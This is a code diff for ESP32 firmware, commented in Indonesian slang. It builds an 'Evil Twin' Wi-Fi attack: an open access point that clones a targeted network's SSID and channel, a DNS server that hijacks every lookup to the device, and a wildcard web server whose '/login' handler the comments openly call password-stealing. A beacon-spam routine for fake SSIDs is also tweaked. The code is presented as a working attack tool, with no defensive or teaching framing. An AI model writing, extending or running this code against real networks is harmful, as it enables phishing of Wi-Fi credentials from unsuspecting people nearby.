@@ -11,9 +11,52 @@
 #include "esp_http_server.h"
 #include "lwip/sys.h"
 #include "lwip/netdb.h"
+#include "lwip/sockets.h"
+
+// Fungsi kirim jawaban DNS (Hijack)
+void dns_server_task(void* pvParameters) {
+    int s = (int)pvParameters;
+    uint8_t rx_buffer[512];
+    while(1) {
+        struct sockaddr_in source_addr;
+        socklen_t addr_len = sizeof(source_addr);
+        int len = recvfrom(s, rx_buffer, sizeof(rx_buffer), 0, (struct sockaddr *)&source_addr, &addr_len);
+
+        if (len > 0) {
+            rx_buffer[2] |= 0x80; // Flags: Response
+            rx_buffer[3] |= 0x80; // Flags: Authoritative
+            rx_buffer[7] = 1;      // Answer count = 1
+            
+            uint8_t answer[] = { 
+                0xc0, 0x0c,       // Name pointer
+                0x00, 0x01,       // Type A
+                0x00, 0x01,       // Class IN
+                0x00, 0x00, 0x00, 0x3c, // TTL 60s
+                0x00, 0x04,       // Data length 4 (IP)
+                192, 168, 4, 1    // IP ESP32 lu
+            };
+            memcpy(rx_buffer + len, answer, sizeof(answer));
+            sendto(s, rx_buffer, len + sizeof(answer), 0, (struct sockaddr *)&source_addr, addr_len);
+        }
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+}
+
+void start_dns_server() {
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = htons(53);
+
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
+    bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+
+    // Panggil fungsi task tadi secara normal
+    xTaskCreate(dns_server_task, "dns_task", 4096, (void*)sock, 5, NULL);
+}
 
 
-void startEvilTwin(void);
+
 // Fungsi sakti buat ubah Teks MAC ke Bytes
 void stringToMac(const char* macStr, uint8_t *macAddr) {
     unsigned int m[6];
@@ -78,32 +121,68 @@ esp_err_t portal_get_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+void start_web_server() {
+    httpd_handle_t server = NULL;
+    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+    config.max_uri_handlers = 8;
+    // Biar semua alamat liar (google, dll) ditangkep sama portal kita
+    config.uri_match_fn = httpd_uri_match_wildcard;
+
+    printf("Membuka Pintu Warung (Web Server)...\n");
+    if (httpd_start(&server, &config) == ESP_OK) {
+        
+        // 1. DAFTARIN portal_get_handler (Biar dia guna buat nyajiin login_html)
+        httpd_uri_t portal_uri = {
+            .uri       = "/*",           // Tangkap semua request
+            .method    = HTTP_GET,
+            .handler   = portal_get_handler, // Fungsi penyambut lu dipanggil di sini
+            .user_ctx  = NULL
+        };
+        httpd_register_uri_handler(server, &portal_uri);
+
+        // 2. DAFTARIN login_post_handler (Biar dia guna buat nyolong password)
+        httpd_uri_t login_uri = {
+            .uri       = "/login",
+            .method    = HTTP_POST,
+            .handler   = login_post_handler, // Fungsi pencuri lu dipanggil di sini
+            .user_ctx  = NULL
+        };
+        httpd_register_uri_handler(server, &login_uri);
+        
+        printf("Web Server Siap Tempur!\n");
+    }
+}
+
+
 // Fungsi nyalain Evil Twin
 void startEvilTwin() {
     esp_wifi_stop();
-    esp_wifi_set_mode(WIFI_MODE_APSTA); // AP buat portal, STA buat deauth
+    vTaskDelay(pdMS_TO_TICKS(50));
+    esp_wifi_set_mode(WIFI_MODE_APSTA); 
     
     wifi_config_t ap_config = {
-        .ap = { .authmode = WIFI_AUTH_OPEN, .max_connection = 4 }
+        .ap = {
+            .ssid_hidden = 0,
+            .max_connection = 4,
+            .authmode = WIFI_AUTH_OPEN,
+            .channel = targetTerkunci.channel
+        },
     };
     strncpy((char*)ap_config.ap.ssid, targetTerkunci.ssid, 32);
     
     esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    vTaskDelay(pdMS_TO_TICKS(100));
     esp_wifi_start();
     
-    // Nyalain HTTP Server
-    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
-    httpd_handle_t server = NULL;
-    if (httpd_start(&server, &config) == ESP_OK) {
-        httpd_uri_t login_uri = { .uri="/login", .method=HTTP_POST, .handler=login_post_handler };
-        httpd_register_uri_handler(server, &login_uri);
-        httpd_uri_t portal_uri = { .uri="*", .method=HTTP_GET, .handler=portal_get_handler };
-        httpd_register_uri_handler(server, &portal_uri);
-    }
+    // --- INI KUNCINYA COK ---
+    vTaskDelay(pdMS_TO_TICKS(50));
+    start_dns_server();  // Paksa HP buka web
+    start_web_server();  // Kasih web loginnya
     
     isEvilTwin = true;
-    evilTwinState = 1;
+    evilTwinState = 1; // Status: Waiting for data...
 }
+
 
 
 
@@ -246,7 +325,7 @@ void loopWiFi(void * pvParameters) {
                 spamUdahSetup = true;
             }
             if (aktifModeSpam == 1) {
-                int randomIdx = esp_random() % 8; 
+                int randomIdx = esp_random() % 10; 
                 sendBeacon(fakeSSIDs[randomIdx]);
                 vTaskDelay(pdMS_TO_TICKS(10)); 
             } 
